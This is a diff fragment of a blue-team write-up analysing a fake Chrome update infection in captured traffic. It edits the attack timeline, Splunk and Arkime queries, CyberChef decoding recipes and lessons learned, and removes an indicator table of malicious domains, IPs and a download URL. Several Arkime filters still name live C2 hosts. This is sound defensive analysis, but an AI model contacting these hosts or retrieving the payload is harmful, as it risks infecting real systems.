+    On Oracle Linux `sudo` only searches its `secure_path`, which does not include `/usr/local/bin`. Use the full path (`sudo /usr/local/bin/pcap-ingest …`) if you ever need it. But re-ingesting a case re-runs **Zeek and Arkime** too and can put every log into Splunk and Arkime **twice**, doubling the counts on this page. `snort-test` is enough to test a rule.
 
 ---
 
@@ -830,44 +949,26 @@ Same times and port as Zeek's `http.log` — tools agree.
 |---|---|
 | 20:27:15 | Capture starts |
 | 20:27:17–18 | CONSERVATOR-PC and **lloyd.maxwell** log on (Kerberos) |
-| 20:27:52 | `www.cnn.com` opened (noise — ads and CDNs follow) |
-| 20:27:53 | `www.stmarybahrain[.]com/new/` opened (no Referer) — **hacked site** |
-| 20:27:54 | Site scripts load with injected code (7 `.js` files) |
+| 20:27:52 | `www.cnn.com` opened (noise — ads follow) |
+| 20:27:53 | `www.stmarybahrain[.]com` opened, no Referer — **hacked site** |
 | 20:27:55–56 | `track.positiverefreshment[.]org/s_code.js` ×3 — fingerprint, TDS passes the PC |
 | 20:27:57 | Fake **"Update Chrome"** page from `lw2e.sineadhollywoodnutt[.]com` |
-| 20:28:00–01 | Auto-download from Dropbox: `Chrome_72.3.22.js` (HTTPS) |
-| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **user runs the .js (wscript.exe)** |
-| 20:28:47 | POST `a=` — hello |
-| 20:28:48 | POST `b=` — PC profile; reply **349 KB encrypted payload** |
-| 20:28:50 | POST `c=` — payload saved and run as `%TEMP%\Chrome_72.3.22.exe` |
-| 20:29:00 | First follow-on C2 attempt 46.105.131.66:443 (refused) |
-| 20:31:14 | First attempt 107.170.231.118:4143 (no answer) |
-| 20:29–20:59 | Attempts repeat every ~7.5 min — never connect |
+| 20:28:00–01 | 3 s timer → Dropbox → `Chrome_72.3.22.js` (~20 KB, HTTPS) |
+| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **user ran the .js** |
+| 20:28:47 | POST `a=` — check-in |
+| 20:28:48 | POST `b=` — host profile; reply **349 KB** hex payload |
+| 20:28:50 | POST `c=` — `%TEMP%\Chrome_72.3.22.exe` reported |
+| 20:29:00 | First C2 attempt 46.105.131.66:443 (refused) |
+| 20:31:14 | First C2 attempt 107.170.231.118:4143 (no answer) |
+| 20:29–20:59 | Attempts alternate every ~7.5 min — never connect |
 | 20:33–20:35 | Chrome component update via BITS (normal) |
-| 20:59:06 | Capture ends; PC still trying |
-
----
-
-## IOCs { #iocs }
-
-| Type | Value | Note |
-|---|---|---|
-| Domain / IP | `www.stmarybahrain[.]com` — 66.226.144.232 | Hacked site; script injected into 7 `.js` files under `/new/` |
-| Domain / IP | `track.positiverefreshment[.]org` — 185.244.149.74 | TDS, `/s_code.js?cid=220` |
-| Domain / IP | `lw2e.sineadhollywoodnutt[.]com` — 93.95.100.178 | Fake "Update Chrome" page, `/topics/index.php`, `/chromefiles/` |
-| URL | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` | Download link (Dropbox abused) |
-| Domain / IP | `bb17eb22.login3.kimbrelelectric[.]com` — 93.95.100.138 | WScript C2, POST `/blank.gif`, payload delivery |
-| HTTP header | `Age: 464b8967d47e14d7` in a request | Victim/session ID sent by the script |
-| IP:port | 46.105.131.66:443, 107.170.231.118:4143 | Follow-on C2 attempts (no DNS) |
-| File | `C:\Users\<user>\Downloads\Chrome_72.3.22.js` | Fake update script (hash: from host) |
-| File | `C:\Users\<user>\AppData\Local\Temp\Chrome_72.3.22.exe` | Payload (hash: from host) |
-| MD5 | `dd83bbcc7dd4184b352f9882c3fe8408` | 348,868-byte **encoded** C2 reply as seen on the wire — not the EXE |
+| 20:59:06 | Capture ends |
 
 ---
 
 ## Incident ticket { #ticket }
 
-Key findings only, short sentences, simple English. Operator name, operator log times and ticket links are placeholders to replace.
+Key findings only, short sentences, simple English; baselining and the MAC address are left out. Operator name, log times and ticket links are placeholders.
 
 [:material-download: Download the ticket as a txt file](files/180630_CONSERVATOR-PC_ticket.txt){ .md-button }
 
@@ -875,40 +976,39 @@ Key findings only, short sentences, simple English. Operator name, operator log 
 --8<-- "docs/blueteam/investigations/files/180630_CONSERVATOR-PC_ticket.txt"
 ```
 
-Before sending: replace the operator log times and name with your own, and add the `ingest.log` SHA256 if your team records it.
-
 ---
 
 ## Copy-ready queries { #query-sheet }
 
-Replace `<case>` with your case name. Drop `tags`/`pcap_case` on a live network.
+Replace `<case>` with your case name.
 
 **Splunk (Zeek)**
 
 ```spl
 index=zeek sourcetype=zeek:conn | stats count by pcap_case
-index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
-index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h | sort - sessions
-index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count by request_type client service success | sort first
-index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h query qtype_name answers
-index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host | sort first
-index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<host1>","<host2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | dedup host uri | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
-index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(host) as hosts by user_agent | sort first
-index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
-index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*dropbox*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
-index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
-index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<host ip> ts><epoch> | where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h) | stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort first
-index=zeek sourcetype=zeek:dns pcap_case=<case> answers IN ("<ip1>","<ip2>") | table ts query answers
-index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state gap
+index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
+index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
+index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort - sessions
+index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client | sort first
+index=zeek sourcetype=zeek:ntlm pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
+index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h query qtype_name rcode_name
+index=zeek sourcetype=zeek:software pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t host software_type name unparsed_version
+index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 | stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p | sort - count
+index=zeek sourcetype=zeek:dns pcap_case=<case> id_orig_h=<pc> NOT query="*<own domain>" | rex field=query "(?<domain>[^.]+\.[^.]+)$" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(query) as names values(query) as examples by domain | eval examples=mvindex(examples,0,2) | sort first
+index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h | sort first
+index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host | sort first
+index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<h1>","<h2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*" | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
+index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*<name>*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
+index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
+index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t tx_hosts rx_hosts mime_type seen_bytes md5
+index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
+| makeresults | eval t=strftime(<epoch_ms>/1000, "%Y-%m-%d %H:%M:%S.%3N") | table t
 ```
 
 **Arkime**
 
 ```text
 tags == <case>
-tags == <case> && ip.src == 172.16.2.169 && port.dst == 138
-tags == <case> && host.http == www.stmarybahrain.com && http.uri == *.js*
-tags == <case> && host.http == track.positiverefreshment.org
 tags == <case> && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
 tags == <case> && host.http == bb17eb22.login3.kimbrelelectric.com
 tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
@@ -917,27 +1017,29 @@ tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
 **CyberChef**
 
 ```text
-Hidden JS strings:   Find / Replace (Regex (.)(.) → $2, Global)  →  Reverse (Character)
-C2 POST bodies:      From Hex  →  XOR Brute Force (Key length 1, Crib &1=)  →  XOR (Key <hex>)  →  URL Decode
+Hidden JS strings:   Find / Replace (Regex (.)(.) -> $2, Global)  ->  Reverse (Character)      [input without quotes]
+C2 POST bodies:      From Hex  ->  XOR Brute Force (Key length 1, Crib &1=)  ->  XOR (Key <hex>)  ->  URL Decode
+Epoch ms:            From UNIX Timestamp (Units: Milliseconds)
 ```
 
 ---
 
 ## Lessons { #lessons }
 
-1. **Busy browsing hides a short attack.** 185 destinations; the infection is four hosts in one minute. Group HTTP by host and rule out the known-good (BITS, CryptoAPI, CDNs) first.
-2. **The Referer is the chain.** Every malicious request pointed back to `/new/` on the church site — proof that the site, not another tab, started it.
-3. **A new User-Agent = a new program.** Chrome → `MSIE 7.0` + `UA-CPU` 46 seconds after a download means the user ran the file.
-4. **Splunk for "who/when/how big", Arkime for "what exactly".** Zeek gave sizes and hashes; the redirect URLs, the download link and the profile data were only in the bodies.
-5. **Simple tricks, simple recipes.** "Every second character, reversed" and "hex + 1-byte XOR" fall to two- and four-step CyberChef recipes. A crib from the **format** (`&1=` in a form post) found every key.
-6. **Encoded payloads skip EXE searches.** 349 KB of hex text labelled `text/plain` was the payload. Judge by size and context, not by MIME type.
-7. **Failed connections are evidence.** `REJ` and `S0` with no bytes, to hard-coded IPs, on a timer, right after a payload — that is an infection with a dead C2, not a clean PC.
-8. **Write what traffic cannot show, and where to find it.** The `.js` and `.exe` content and hashes, persistence and the real malware family all come from the host.
+1. **Baselining notes pay off later.** Three unexplained lines (two silent IPs, one odd User-Agent) were the whole infection; each was explained only once later facts arrived.
+2. **Busy browsing hides a short attack.** 184 destinations; the infection is a handful of hosts in one minute. Remove the known-good (CDN, ads, BITS, CryptoAPI, CNAME to ad platforms) and read what is left.
+3. **No DNS + a fixed rhythm = a program.** The no-DNS subsearch reduced 184 destinations to the two C2 IPs.
+4. **The Referer is the chain.** Every malicious request pointed back to the church page.
+5. **A new User-Agent = a new program.** `MSIE 7.0` + `UA-CPU` 46 s after a download meant the file had run; `b=` proved it.
+6. **Splunk for who/when/how much, Arkime for what exactly.** The download URL and the profile data were only in bodies.
+7. **Decoders travel with the encoded text.** Read the function and translate it, or run it alone in an offline console. Without a decoder, read the shape: character set → layer → crib from the format.
+8. **Check the input before blaming the recipe.** Quotes, a missing prefix or a cut-off wrap changed every result; `ABC` and Zeek's body length catch it.
+9. **Know your tools' limits.** Multi-value `host` doubled counts; Arkime's 200-packet limit hid `c=`; re-ingesting would have doubled everything.
+10. **Keep data and inference apart.** "Timing fits" is inference; "the decoded code says so" is evidence. The ticket gets evidence.
 
 ## References { #references }
 
-- [Night Dew, second pass — pcapbox, Arkime + Splunk, Snort test guide](night-dew-arkime-splunk-netlogon-bruteforce.md)
-- [Phishing red herring to exploit-kit drive-by — another hacked-site chain](phishing-red-herring-ek-driveby-ursnif-c2.md)
+- [Night Dew, second pass — pcapbox, Snort test guide](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT — Splunk-first baselining](beguilesoft-hawkeye-ftp-exfil.md)
 - [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
 - [Zeek logs](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md) · [ssl & x509](../../network/zeek/ssl-x509.md)
 - [Beaconing & C2](../../network/beaconing-c2.md) · [Playbook: compromised workstation](../playbooks/compromised-workstation.md)
